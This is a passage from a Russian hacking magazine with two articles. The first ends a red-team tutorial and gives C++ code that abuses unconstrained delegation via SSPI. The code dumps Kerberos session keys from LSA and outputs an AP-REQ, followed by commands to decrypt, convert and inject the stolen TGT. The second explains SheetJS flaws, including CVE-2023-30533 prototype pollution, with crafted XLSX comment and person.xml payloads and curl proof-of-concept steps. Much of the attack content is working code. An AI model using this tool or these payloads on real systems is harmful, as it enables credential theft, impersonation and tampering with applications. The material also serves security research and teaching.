к полученному имени службу CIFS. В итоге у нас появляется валидный SPN
на службу CIFS контроллера домена.


targetname = removeLeadingCharacters(targetname);
#ifdef DEBUG
    std::wcout << L"[+] Target: " << targetname << std::endl;
#endif
    LPCWSTR SPN = addCIFS(targetname);

Функция removeLeadingCharacters  просто  чуть‑чуть смещает  указатель
на полученную строку, чтобы первые два символа \\ как бы пропали.


LPCWSTR removeLeadingCharacters(LPCWSTR originalString) {
    LPCWSTR stringPtr = originalString;
    if (stringPtr[0] == L'\' && stringPtr[1] == L'\') {
        stringPtr += 2;
    }
    return stringPtr;
}

А функция addCIFS() добавляет строку CIFS/ к имени компьютера.


LPCWSTR addCIFS(LPCWSTR originalString) {
    size_t originalSize = wcslen(originalString);
    size_t cifsSize = 5;
    size_t newSize = originalSize + cifsSize + 1;
    LPWSTR newString = new WCHAR[newSize];
    wcscpy_s(newString, newSize, L"CIFS/");
    wcscat_s(newString, newSize, originalString);
    return newString;
}

Есть и второй вариант — пользователь должен самостоятельно указать SPN.
Здесь никакого парсинга тогда не потребуется. Сразу передаем полученный
SPN в функцию TgtDeleg(), в которой реализована логика получения сес‐
сионного ключа и блоба AP-REQ.


case '2':
        if (TgtDeleg(argv[2]) == 0) {
            std::wcout << L"[+] TgtDeleg Success" << std::endl;
            return 0;
        }
        else {
            std::wcout << L"[-] TgtDeleg Error" << std::endl;
            return -1;
        }
        break;
    default:
        std::wcout << L"[-] No such mode" << std::endl;
        ShowUsage();
        return 0;
    }


ПОДКЛЮЧЕНИЕ К СЛУЖБЕ

Переходим в сердце программы — в функцию TgtDeleg(). Она принимает
один‑единственный аргумент — это SPN целевой службы. Затем начинается,
как кто‑то очень интересно выразился, «магия SSPI». В действительности
никакой магии нет. SSPI можно считать эдакой апишкой, через которую раз‐
работчики  могут  связываться  с  поставщиками  безопасности  (Security
Packages). Возможности SSPI очень большие: шифрование, подпись, выстра‐
ивание контекста. Именно функции SSPI позволят нам сымитировать обра‐
щение к службе с неограниченным делегированием.
   Начнем  с  функции  AcquireCredentialsHandle().  Она   позволяет
получить хендл на собственные реквизиты для SSPI, а также указать протокол,
на основе которого будет выстраиваться контекст. Под реквизитами понима‐
ется пара «логин:пароль», на основе которых пользователь может пройти
аутентификацию. Контекст выстраивать не придется — нам достаточно будет
один раз просто обратиться к службе, а ОС уже самостоятельно пойдет
к KDC, получит TGS и проверит флаг OK-AS-DELEGATE.


SECURITY_STATUS SEC_Entry AcquireCredentialsHandle(
  _In_  SEC_CHAR       *pszPrincipal,
  _In_  SEC_CHAR       *pszPackage,
  _In_  ULONG          fCredentialUse,
  _In_  PLUID          pvLogonID,
  _In_  PVOID          pAuthData,
  _In_  SEC_GET_KEY_FN pGetKeyFn,
  _In_  PVOID          pvGetKeyArgument,
  _Out_ PCredHandle    phCredential,
  _Out_ PTimeStamp     ptsExpiry
);

Отмечу самые основные параметры:
 • pszPrincipal — имя сущности, для которой мы получаем реквизиты.
   Никаких сущностей, ни живых, ни мертвых, у нас нет, поэтому указываем
  NULL, что позволяет получить реквизиты для текущего потока;
 • pszPackage — какой поставщик безопасности использовать;
 • fCredentialUse — для каких целей будут использованы реквизиты.

Указываем SECPKG_CRED_OUTBOUND, так как мы инициализируем построение
контекста, а значит, должны отдавать свои данные службе. Если бы мы выс‐
тупали в качестве службы, то указывали бы SECPKG_CRED_INBOUND, то есть
получали данные, которые отправил клиент.
   Параметр pAuthData —  опциональная  структура,  в которую  можно
передать реквизиты, специфичные для используемого поставщика безопас‐
ности. Например, если бы требовалось пройти аутентификацию от лица ино‐
го пользователя, не от того, от которого запущен инструмент, то мы бы
использовали структуру SEC_WINNT_AUTH_IDENTITY.


typedef struct _SEC_WINNT_AUTH_IDENTITY_A {
  unsigned char *User;
  unsigned long UserLength;
  unsigned char *Domain;
  unsigned long DomainLength;
  unsigned char *Password;
  unsigned long PasswordLength;
  unsigned long Flags;
} SEC_WINNT_AUTH_IDENTITY_A, *PSEC_WINNT_AUTH_IDENTITY_A;

А инициализировали бы ее вот так:


SEC_WINNT_AUTH_IDENTITY_A authIdentity = {0};
authIdentity.User = L"username";
authIdentity.UserLength = lstrlen(L"username");
authIdentity.Domain = L"office.local";
authIdentity.DomainLength = lstrlen(L"office.local");
authIdentity.Password = L"pass123";
authIdentity.PasswordLength = lstrlen(L"pass123");
authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE; // Если строки
юникода. Если анси, то SEC_WINNT_AUTH_IDENTITY_ANSI

Элемент phCredential — указатель на структуру CredHandle для получения
дескриптора учетных данных.
   Вызываем эту функцию, получаем хендл на свои реквизиты.


CredHandle hCredential;
TimeStamp tsExpiry;
SECURITY_STATUS status = AcquireCredentialsHandleW(NULL, (LPWSTR)
MICROSOFT_KERBEROS_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL
, &hCredential, &tsExpiry);
    if (status == SEC_E_OK) {
        ... // Все ОK
    } else {
        switch (status) {
        case SEC_E_INSUFFICIENT_MEMORY:
            std::wcout << L"[-] Not enough memory for current creds"
<< std::endl;
            break;
        case SEC_E_INTERNAL_ERROR:
            std::wcout << L"[-] SSPI ERROR: 0x" << std::hex << status
<< L"L" << std::endl;
            break;
        case SEC_E_NO_CREDENTIALS:
            std::wcout << L"[-] No Credentials Available" << std::
endl;
            break;
        case SEC_E_NOT_OWNER:
            std::wcout << L"[-] U Dont Have Credentials" << std::endl
;
            break;
        case SEC_E_SECPKG_NOT_FOUND:
            std::wcout << L"[-] Kerberos AP is not initialized" <<
std::endl;
            break;
        case SEC_E_UNKNOWN_CREDENTIALS:
            std::wcout << L"[-] Credentials were not recognized" <<
std::endl;
            break;
        default:
            std::wcout << L"[-] Unknown Err: 0x" << std::hex <<
status << L"L" << std::endl;
            break;
        }
    }
    return -1;
}

Если что‑то идет не так, то обрабатываем полученную ошибку. Про дебаг
SECURITY_STATUS   написано   в   статье   «Поставщик   небезопасности.
Как Windows раскрывает пароль пользователя».
   Если же все хорошо, то переходим к взаимодействию с целевой службой.
Для этого используем функцию InitializeSecurityContext().


SECURITY_STATUS SEC_ENTRY InitializeSecurityContextA(
  [in, optional]      PCredHandle    phCredential,
  [in, optional]      PCtxtHandle    phContext,
                      SEC_CHAR       *pszTargetName,
  [in]                unsigned long  fContextReq,
  [in]                unsigned long  Reserved1,
  [in]                unsigned long  TargetDataRep,
  [in, optional]      PSecBufferDesc pInput,
  [in]                unsigned long  Reserved2,
  [in, out, optional] PCtxtHandle    phNewContext,
  [in, out, optional] PSecBufferDesc pOutput,
  [out]               unsigned long  *pfContextAttr,
  [out, optional]     PTimeStamp     ptsExpiry
);

Эта функция позволяет обратиться к целевой службе, чтобы начать выстра‐
ивание контекста для безопасного взаимодействия. Именно в этот момент
KDC видит, что клиент пришел к службе с неограниченным делегированием,
и  отдает TGS  с  флагом  OK_AS_DELEGATE.  Стоит  обратить  внимание
на параметр pszTargetName — здесь указываем SPN службы с неограничен‐
ным делегированием. Затем проверяем, успешен ли вызов функции, а также
pfContextAttr. Если он содержит значение ISC_REQ_DELEGATE, то все сра‐
ботало правильно и мы обратились к службе с неограниченным делегирова‐
нием.


CtxtHandle newContext;
        SecBuffer secbufPointer = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc output = { SECBUFFER_VERSION, 1, &secbufPointer
};
        ULONG contextAttr;
        TimeStamp expiry;
        SECURITY_STATUS initSecurity = InitializeSecurityContextW(&
hCredential, NULL, (SEC_WCHAR*)spn, ISC_REQ_ALLOCATE_MEMORY |
ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL
, 0, &newContext, &output, &contextAttr, NULL);
        if (initSecurity == SEC_E_OK || initSecurity ==
SEC_I_CONTINUE_NEEDED) {
            std::wcout << L"[+] Initializing GSS-API" << std::endl;
            if (contextAttr & ISC_REQ_DELEGATE) {
#ifdef DEBUG
                std::wcout << L"[+] SPN Supports Unconstrained Deleg"
<< std::endl;
#endif
                DWORD destSize;
                ...

Причем     в     параметре     fContextReq      указываем      маску
ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH.
Последние два параметра позволят серверу, на который клиент отправляет
контекст, проводить олицетворение этого самого клиента.
   Затем приступаем к получению блоба AP-REQ. Он будет находиться внут‐
ри параметра pvBuffer структуры SecBuffer. Ее мы передали внутри другой
структуры    SecBufferDesc    параметром    output    в    функцию
InitializeSecurityContext(). Сами эти структуры нужны для того, чтобы
SP мог вернуть данные, которые требуются для дальнейшего выстраивания
контекста.   Разнообразия   ради   предлагаю   использовать   функцию
CryptBinaryToStringA() для кодирования блоба в Base64. Кодируем по той
причине, что сам AP-REQ представляет собой большой массив бинарных
данных, корректное отображение которых невозможно.


DWORD destSize;
// Getting AS-REQ blob
BOOL base64 = CryptBinaryToStringA((CONST BYTE*)secbufPointer.
pvBuffer, (DWORD)secbufPointer.cbBuffer, CRYPT_STRING_BASE64 |
CRYPT_STRING_NOCRLF, NULL, &destSize);
char* apreqbuf = (char*)malloc((SIZE_T)destSize);
if (apreqbuf == NULL) {
    std::wcout << L"[-] Unable To allocate memory for AS-REQ b64
blob" << std::endl;
    return -1;
}
else {
    BOOL base64 = CryptBinaryToStringA((CONST BYTE*)secbufPointer.
pvBuffer, (DWORD)secbufPointer.cbBuffer, CRYPT_STRING_BASE64 |
CRYPT_STRING_NOCRLF, apreqbuf, &destSize);
    if (!base64) {
        std::wcout << L"[-] Unable to Base64 Encode AP-REQ blob" <<
std::endl;
        return -1;
    }
    else {
        apreqdata = (BYTE*)secbufPointer.pvBuffer;
        apreqsize = secbufPointer.cbBuffer;
        ...

В этом коде все чуточку проще. В функцию кодирования в Base64 передаем
буфер, содержащий блоб AP-REQ (secbufPointer.pvBuffer), его размер
secbufPointer.cbBuffer, а в ответ получаем размер выходного буфера
(destSize). Затем выделяем в памяти достаточно места под выходной буфер
и записываем туда блоб AP-REQ повторным вызовом функции кодирования
данных.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ВАЖНАЯ ДЕЛЕГАЦИЯ
                               ЭКСПЛУАТИРУЕМ
                                   TGT DELEGATION
                           В ACTIVE DIRECTORY





ПОЛУЧЕНИЕ СЕССИОННЫХ КЛЮЧЕЙ

Теперь у нас есть что расшифровывать, но нечем. Нужно получить сессион‐
ный ключ. Он будет находиться также в пространстве процесса lsass.exe,
внутри AP Kerberos, поэтому для его дампа можно будет использовать стан‐
дартные                 функции               LsaConnectUntrusted()
и LsaCallAuthenticationPackage(). Сессионный ключ клиент получил пос‐
ле успешного вызова InitializeSecurityContext() в ответе KDC пакетом
TGS-REP. Сначала просто подключаемся к LSA.


HANDLE lsaHandle;
LSA_STRING kerbPackage;
kerbPackage.Buffer = (PCHAR)MICROSOFT_KERBEROS_NAME_A;
kerbPackage.Length = (USHORT)lstrlenA(kerbPackage.Buffer);
kerbPackage.MaximumLength = kerbPackage.Length + 1;
ULONG authpackageId;
NTSTATUS connection = LsaConnectUntrusted(&lsaHandle);
if (connection == statusSuccess) {
#ifdef DEBUG
        std::wcout << L"[+] Connection to LSA Success" << std::endl;
#endif
    ...

Нам  достаточно  и  обычного  хендла  на  LSA.  Нет  смысла  дергать
LsaRegisterLogonProcess() для дампа сессионных ключей, ведь они дол‐
жны быть доступны любому пользователю, даже низкопривилегированному
(иначе как бы он шифровал пакеты Kerberos?). Затем я столкнулся с интерес‐
ной проблемой: у тикета есть три вида шифрования — RC4, AES-128, AES-
256. А нам никак не узнать, тикет с какой криптографией сейчас лежит в прог‐
рамме, поэтому придется три раза обращаться к AP Kerberos для поиска нуж‐
ного ключа. Обращение я вынес в отдельную функцию GetSessionKeys().


NTSTATUS LookupPckg = LsaLookupAuthenticationPackage(lsaHandle, &
kerbPackage, &authpackageId);
if (LookupPckg == statusSuccess) {
#ifdef DEBUG
    std::wcout << L"[+] Kerberos AP: " << authpackageId << std::endl;
#endif
    std::wcout << L"[+] Trying RC4" << std::endl;
    NTSTATUS sessKey = GetSessionKeys(lsaHandle, authpackageId, 23,
spn, destSize);
    if (sessKey == 0xC0000034) {
        std::wcout << L"\t[-] No such keys" << std::endl;
        std::wcout << L"[+] Trying AES128" << std::endl;
        sessKey = GetSessionKeys(lsaHandle, authpackageId, 17, spn,
destSize);
        if (sessKey == 0xC0000034) {
            std::wcout << L"\t[-] No such keys" << std::endl;
            std::wcout << L"[+] Trying AES256" << std::endl;
            sessKey = GetSessionKeys(lsaHandle, authpackageId, 18,
spn, destSize);
            if (sessKey != 0) {
                std::wcout << L"[-] Error getting AES256 session
Keys" << std::endl;
                return -1;
            }
            else {
                std::wcout << "[+] Session Key: " << sessionKeyGet <<
std::endl;
                std::wcout << "[+] AP-REQ: " << apreqbuf << std::endl
;
                return 0;
            }
        }
        else if (sessKey == -1) {
            std::wcout << L"[-] Error getting AES128 session Keys" <<
std::endl;
            return -1;
        }
        else {
            std::wcout << "[+] Session Key: " << sessionKeyGet << std
::endl;
            std::wcout << "[+] AP-REQ: " << apreqbuf << std::endl;
            return 0;
        }
    }
    else if (sessKey == -1) {
        std::wcout << L"[-] Error getting RC4 session Keys" << std::
endl;
        return -1;
    }
    else {
        std::wcout << "[+] Session Key: " << sessionKeyGet << std::
endl;
        std::wcout << "[+] AP-REQ: " << apreqbuf << std::endl;
        return 0;
    }


}

Сначала просто получаем идентификатор AP Kerberos, затем пытаемся
получить сессионные ключи для тикета с шифрованием RC4. Если таких клю‐
чей   нет,  нам   выдадут   ошибку   0xC0000034,   которая   функцией
LsaNtStatusToWinError()    преобразуется   в   0x2,   что    означает
ERROR_FILE_NOT_FOUND (файлом, видимо, винда называет сессионный ключ).
Если же что‑то ломается, то прилетает -1. Если все окей, то ключ был
успешно сдамплен, выводим AP-REQ и сам ключик. Ровно такой же алгоритм
повторяем и для AES-128, и для AES-256.
   Функция GetSessionKeys() запрашивает из AP Kerberos сессионные клю‐
чи, передавая структуру KERB_RETRIEVE_TKT_REQUEST.


typedef struct _KERB_RETRIEVE_TKT_REQUEST {
  KERB_PROTOCOL_MESSAGE_TYPE MessageType;
  LUID                       LogonId;
  UNICODE_STRING             TargetName;
  ULONG                      TicketFlags;
  ULONG                      CacheOptions;
  LONG                       EncryptionType;
  SecHandle                  CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;

В качестве MessageType указываем KerbRetrieveEncodedTicketMessage,
а в CacheOptions — KERB_RETRIEVE_TICKET_USE_CACHE_ONLY, что позволит
сдампить сессионные ключи. Сама функция GetSessionKeys() принимает
хендл на LSA, ID AP Kerberos, тип шифрования (23 — RC4, 17 — AES-128,
18 — AES-256), целевой SPN, а также размер буфера.


NTSTATUS GetSessionKeys(HANDLE lsaHandle, ULONG authpackageId, LONG
EncryptionType, LPCWSTR spn, DWORD destSize) {
    PKERB_RETRIEVE_TKT_REQUEST retrieveRequest = NULL;
    PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
    ULONG bufferLength;
    ULONG returnLength;
    NTSTATUS packageStatus = 0;
    int spnSize = lstrlenW(spn);
    USHORT newSpnSize = ((USHORT)lstrlenW((LPCWSTR)spn) + 1) * sizeof
(wchar_t);
    bufferLength = sizeof(KERB_RETRIEVE_TKT_REQUEST) + newSpnSize;
    retrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR,
bufferLength);
    if (retrieveRequest != NULL) {
        retrieveRequest->MessageType =
KerbRetrieveEncodedTicketMessage;
        retrieveRequest->CacheOptions =
KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
        retrieveRequest->EncryptionType = EncryptionType;
        retrieveRequest->TargetName.Length = newSpnSize - sizeof(
wchar_t);
        retrieveRequest->TargetName.MaximumLength = newSpnSize;
        retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)
retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
        RtlMoveMemory(retrieveRequest->TargetName.Buffer, spn,
retrieveRequest->TargetName.MaximumLength);
        NTSTATUS callauthPkg = LsaCallAuthenticationPackage(lsaHandle
, authpackageId, (PVOID)retrieveRequest, bufferLength, (PVOID*)&
retrieveResponse, &returnLength, &packageStatus);
        if (callauthPkg == statusSuccess) {
#ifdef DEBUG
            std::wcout << L"\t[+] Calling AP Kerberos Success" << std
::endl;
#endif
            if (packageStatus == statusSuccess) {
                std::wcout << L"\t[+] Successfully getted Kerberos
keys with these encryption" << std::endl;
                PVOID sessionkeynob64 = (PVOID)malloc((SIZE_T)
retrieveResponse->Ticket.SessionKey.Length);
                if (sessionkeynob64 != NULL) {
                    // Copying Session Key
                    RtlMoveMemory(sessionkeynob64, retrieveResponse->
Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);
                    BOOL base641 = CryptBinaryToStringA((CONST BYTE*)
sessionkeynob64, (DWORD)retrieveResponse->Ticket.SessionKey.Length,
CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destSize);
                    LPSTR sessionKey = (LPSTR)malloc((SIZE_T)destSize
);
                    if (sessionKey != NULL) {
                        BOOL base641 = CryptBinaryToStringA((CONST
BYTE*)sessionkeynob64, (DWORD)retrieveResponse->Ticket.SessionKey.
Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, sessionKey, &
destSize);
                        if (base641) {
                            sessKkey = retrieveResponse->Ticket.
SessionKey.Value;
                            sessionKeyGet = sessionKey;
                            return 0;
                        }
                        else {
                            std::cout << "\t[-] Cant Get string of
session key: " << GetLastError() << std::endl;
                            return -1;
                        }
                    }
                    else {
                        std::cout << "\t[-] Cant LocalAlloc for
session key: " << GetLastError() << std::endl;
                        return -1;
                    }
                }
                else {
                    std::cout << "\t[-] Unable to allocate memory
for kerberos keys: " << GetLastError << std::endl;
                    LocalFree(retrieveRequest);
                    LsaFreeReturnBuffer((PVOID)retrieveResponse);
                    return -1;
                }
            }
            else {
                return packageStatus;
            }
        }
    }
    else {
        DWORD Gle = GetLastError();
        std::cout << "\t[-] Error LocalAlloc for
KERB_RETRIEVE_TKT_REQUEST: " << Gle << std::endl;
        return -1;
    }
}

Логика достаточно простая: готовим структуру KERB_RETRIEVE_TKT_REQUEST,
которую динамически выделяем в памяти. Затем инициализируем все нужные
элементы,  отдельно  копируем SPN  в имя  целевой  службы  функцией
RtlMoveMemory(), иначе Kerberos не поймет, сессионный ключ какого тикета
нужно сдампить, а затем проверяем успешность вызова функции.
   Если функция дернулась успешно, то копируем сессионный ключ, а затем
кодируем его в Base64, повторяя все те же операции, что и для блоба AP-
REQ.


РАСШИФРОВКА AP-REQ

После получения AP-REQ и сессионного ключа я принял решение не дек‐
риптить блоб на хосте. Инструмент будет выводить только сессионный ключ
в Base64 и сам AP-REQ, а расшифровку сделаем на хосте атакующего.





                     Сессионный ключ и блоб AP-REQ

Такое решение я принял неслучайно — для расшифровки AP-REQ исполь‐
зуется недокументированный криптоинтерфейс Windows, который легитим‐
ные программы не используют в принципе. Так или иначе, мы его изучим,
но чуть позже, когда будем писать инструмент для запроса TGT и TGS на C++.
Лишь вкратце отмечу, что для обнаружения и инициализации всех методов
этого криптоинтерфейса используется функция CDLocateCSystem(). Проб‐
лема в том, что при первом же гуглении ее имени мы натыкаемся на очень
интересные статьи.





                           Подозрительная функция

Функция крайне подозрительная, плюс, скорее всего, ее вызов отслежива‐
ется даже самыми простыми АВ. Поэтому, чтобы сохранить чистоту инстру‐
мента, предлагаю перенести расшифровку на компьютер атакующего.


        WWW

                            Если тебе интересно посмотреть, как эту рас‐
                        шифровку реализует Kekeo или Rubeus, то вот
                          ссылки на код:
                  •Kekeo:           файлы            kuhl_m_tgt
                       и kull_m_kerberos_asn1_crypto.c;
                  •Rubeus: файл Crypto.cs.


Для расшифровки AP-REQ и извлечения TGT из него можно использовать
скрипт tgtParse.py.


python tgtParse.py --etype <тип шифрования> --sessionkey <сессионный
ключ> --apreq <ap req блоб>





                           Получение тикета ccache

Затем в текущей директории появится тикет .ccache, который можно пре‐
образовать в формат .kirbi с помощью ticketConverter.py.





                               Извлеченный тикет


python ticketConverter.py Администратор.ccache admin.kirbi





                    Успешное преобразование тикета





                           Тикет в текущей директории

Наконец, инжектим тикет с помощью инструмента на PowerShell.


.\injector.ps1 2 "doi..."





                        Успешный инжект тикета


ВЫВОДЫ

Функции делегирования в Active Directory предоставляют множество необыч‐
ных и недокументированных возможностей,  эксплуатация которых очень
сильно упрощает жизнь атакующему. А если этот атакующий еще и умеет все
написать c нуля, разобраться в атаке, обойти защитные средства, то он
в шаге от превращения в настоящего редтимера! Полный код проекта ты
можешь отыскать на GitHub.
ВЗЛОМ





                        КАК РАБОТАЮТ
                      УЯЗВИМОСТИ
               В БИБЛИОТЕКЕ SHEETJS




Пакет   XLSX,   выпущенный   компанией
SheetJS, широко используется разработ‐
чиками для  взаимодействия с  электрон‐
ными таблицами в форматах XLSX и XLSM,
в том числе применяется в корпоративных        Всеволод Кокорин                                                                                    Аудитор информационной
продуктах.  Анализируя  пакет, мы  нашли         безопасности SolidLab                                                                                        sevakokorin80@gmail.com
несколько уязвимостей. В этой статье я
покажу, как они возникли и как их может
эксплуатировать злоумышленник.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Давай вкратце посмотрим, как работает SheetJS. Когда файл электронной
таблицы XLSX передается функции XLSX.readFile, происходит следующее:
 • Функция проверяет тип файла, анализируя первые байты заголовка. Если
   тип файла распознан как ZIP-архив, процесс продолжается.
 • Файл архива распаковывается в память процесса, что позволяет работать
   непосредственно с XML-файлами, описывающими структуру и данные
   электронной таблицы, а также с другими ресурсами, включая изображения
   и шрифты.
 • Парсер, встроенный в библиотеку, начинает разбор XML-тегов. Он ана‐
   лизирует  структуру  файла и  извлекает необходимые  данные,  такие
   как значения ячеек, форматирование и другие свойства таблицы.
 • Полученные данные обычно представляются в виде удобных структур,
   таких как массивы или объекты, чтобы их можно было легко использовать
   в приложении.


LIMITED PROTOTYPE POLLUTION

Описание недостатка
Уязвимость, связанная с ограниченным загрязнением прототипа (Limited
Prototype Pollution), возникает при обработке комментариев внутри загружен‐
ного документа в функции cmntcommon. В ней присваивается значение объ‐
екта по ключу, который может контролироваться пользователем.


else sheet[comment.ref] = cell;

Для дальнейшего анализа важно понимать, что такое comment.ref. Это зна‐
чение попадает в код из файла threadedCommentXXX.xml (где XXX — номер
документа с комментариями). Пример:


<threadedComment ref="G7" dT="2023-04-11T09:41:09.71" personId="{
29DB960B-0822-594C-AB20-3D499FA339C7}" id="{
962D1EF3-37F7-FF40-983D-B0762466C0AF}">

Обычно, когда файл создается в редакторе электронных таблиц, это не
вызывает проблем, так как адреса ячеек редактор сгенерирует автоматичес‐
ки и это будут допустимые значения.
   Однако разработчики пакета XLSX не учли, что злоумышленник может
вручную создать файл XLSX с произвольным содержимым и специально
сформировать адреса ячеек.


7z x normal.xlsx
; Вносим изменение в желаемые файлы
7z a NotNormal.zip ./\[Content_Types\].xml _rels/ docProps/ xl
mv NotNormal.zip NotNormal.xlsx

Для  успешной   эксплуатации  загрузим  обычный  файл,  но  с  таким
threadedComment:


<threadedComment ref="__proto__" dT="2023-04-11T09:41:09.71"
personId="{29DB960B-0822-594C-AB20-3D499FA339C7}" id="{
962D1EF3-37F7-FF40-983D-B0762466C0AF}">

В таком случае значение comments.ref будет равно __proto__, а cell будет
содержать Object prototype.
   Далее в коде функции находим обращение к cell:


if (!cell.c) cell.c = [];

Так как переменная содержит prototype, то массив запишется в свойство c
прототипа объекта. Это приведет к тому, что при дальнейших проверках все
комментарии будут записываться в один массив, так как значение cell.c
будет всегда определено. Разработчикам следовало использовать такую
конструкцию:


if (!cell.hasOwnProperty("c")) cell.c = [];

Давай набросаем доказательство концепции:


const express = require('express');
const fileUpload = require('express-fileupload');
const app = express();
const XLSX = require("xlsx");


// Middleware для обработки файлов
app.use(fileUpload());


// Получение POST-запроса c обработкой загруженного файла
app.post('/process', function(req, res) {
    if (!req.files || Object.keys(req.files).length === 0) {
        return res.status(400).send('Не найдены загруженные файлы.');
    }


  // Получение загруженного файла
    const uploadedFile = req.files.file;
    let a = XLSX.read(uploadedFile.data);
    /*
        Далее может следовать любая обработка файла и т. д.
    */
    res.send('Файл успешно обработан.');
});


// Обработка GET-запроса c выдачей простого документа
app.get('/getSample', function(req, res) {
    var ws = XLSX.utils.aoa_to_sheet([["SheetJS"], [5433795],[123123
]]);
    var wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, 'Sheet1');
    const xlsxData = XLSX.write(wb, { type: 'buffer' });


    // Возврат обработанного файла
    res.set('Content-Type', 'application/vnd.
openxmlformats-officedocument.spreadsheetml.sheet');
    res.set('Content-Disposition', 'attachment;
filename="processed_file.xlsx"');
    res.send(xlsxData);
});
// Запуск сервера
app.listen(3000, function() {
  console.log('Сервер запущен на порте 3000');
});

Этот скрипт принимает файл для обработки на эндпоинте /process, а при
запросе /getSample возвращает пример обычного файла XLSX (который
не содержит комментариев).
   Сделаем  несколько  запросов  на  сервер.  Сначала  обратимся  к  /
getSample и откроем файл, чтобы просмотреть его содержимое:



  $ curl http://localhost:3000
  /getSample -o sample.xlsx
    % Total    % Received % Xferd  Average Speed   Time    Time     Time
  Current
                                   Dload  Upload   Total   Spent    Left
  Speed
    0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:-
  -100 22023  100 22023    0     0  1312k      0 --:--:-- --:--:-- --:--:-
  - 1955k
  $ open sample.xlsx





                      Содержимое открытого файла

А теперь выполним серию запросов с нашим специальным файлом:



  $ curl -X POST --form file=@
  /Users/slonser/hack_xslsx/slon.xlsx http://localhost:3000/process

  Файл успешно обработан.⏎
  $ curl http://localhost:3000
  /getSample -o sample.xlsx
    % Total    % Received % Xferd  Average Speed   Time    Time     Time
  Current
                                   Dload  Upload   Total   Spent    Left
  Speed
    0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:-
  -100 22023  100 22023    0     0  1312k      0 --:--:-- --:--:-- --:--:-
  - 1955k
  $ open sample.xlsx





                       Текущее содержимое файла


Реакция разработчиков
В версии 0.19.3 пакета XLSX разработчики постарались устранить этот баг.
Они добавили такую проверку:


var r = decode_cell(comment.ref);
if(r.r < 0 || r.c < 0) return;

Теперь, если comment.ref содержит невалидное название ячейки таблицы,
выполнение функции прервется.
    Багу выдан идентификационный номер CVE-2023-30533.


МОДИФИКАЦИЯ ФАЙЛОВ PERSON И THREADEDCOMMENT

Описание недостатка
Мы продолжили изучать функции, связанные с комментариями, и обнаружили
возможность модифицировать файлы person и threadedComment внутри ZIP-
архива.
   Дело в том, что при создании файлов XLSX-атрибуты тегов внутри XML-
структуры всегда обрамляются двойными кавычками. Пример:


<comments xmlns="http://schemas.openxmlformats.org/spreadsheetml/
2006/main" ...

В функции parsexmltag, которая отвечает за парсинг тегов, для извлечения
значений атрибутов используется такое регулярное выражение:


var attregexg=/([^"\s?>\/]+)\s*=\s*((?:")([^"]*)(?:")|(?:')([^']*)(?:
')|([^'">\s]+))/g;

Оно явно откуда‑то скопировано и реализует полный парсинг атрибутов
в соответствии со стандартом RFC 5364. Здесь учтено, что атрибуты могут
быть в двойных или в одинарных кавычках.
   Теперь   посмотрим   функцию,   которая    отвечает   за   запись
в theradedComment:


o.push(writextag('threadedComment', writetag('text', c.t||""), tcopts
));
...
return o.join("");

Тут ясно видно, что все части XML-документа собираются в массив, а затем
объединяются в одну строку. Но в этом процессе нет фильтрации данных,
поступающих в функцию writetag. Давай посмотрим, что у нее внутри:


function writetag(f,g) { return '<' + f + (g.match(wtregex)?' xml:
space="preserve"' : "") + '>' + g + '</' + f + '>'; }

Здесь понятно, что наши данные превращаются в теги, но без предваритель‐
ной фильтрации или проверки.


function write_people_xml(people/*, opts*/) {
    var o = [XML_HEADER, writextag('personList', null, {
        'xmlns': XMLNS.TCMNT,
        'xmlns:x': XMLNS_main[0]
    }).replace(/[\/]>/, ">")];
    people.forEach(function(person, idx) {
        o.push(writextag('person', null, {
            displayName: person,
            id: "{54EE7950-7262-4200-6969-" + ("000000000000" + idx).
slice(-12) + "}",
            userId: person,
            providerId: "None"
        }));
    });
    o.push("</personList>");
    return o.join("");
}

В функции write_person_xml тоже нет фильтрации данных.
   Используем уже готовый код сервера с уязвимой версией XLSX, чтобы
подтвердить наличие проблемы.
   Изменим файл person.xml следующим образом:


<personList xmlns="http://schemas.microsoft.com/office/spreadsheetml/
2018/threadedcomments" xmlns:x="http://schemas.openxmlformats.org/
spreadsheetml/2006/main"><person displayName='" Slonser="SolidLab'
id="{29DB960B-0822-594C-AB20-3D499FA339C7}" userId="" providerId="AD"
/></personList>

Как видно, displayName указан внутри одинарных кавычек. Отправим этот
файл:



  $ curl -X POST --form file=@/solidlab.xlsx http://local
  host:3000/process

  Файл успешно обработан.⏎
  $ curl http://localhost:3000/getSample -o solidlab1.xlsx
    % Total    % Received % Xferd  Average Speed   Time    Time     Time
  Current
                                   Dload  Upload   Total   Spent    Left
  Speed
  100 21760  100 21760    0     0  1561k      0 --:--:-- --:--:-- --:--:--
  2125k


Теперь распакуем архив и просмотрим person.xml:


><person displayName="SheetJ5" id="{
54EE7950-7262-4200-6969-000000000000}" userId="SheetJ5" providerId=
"None"/><person displayName="" Slonser="SolidLab" id="{
54EE7950-7262-4200-6969-000000000001}" userId="" Slonser="SolidLab"

Тегу <threadedComment> был добавлен  атрибут Slonser со  значением
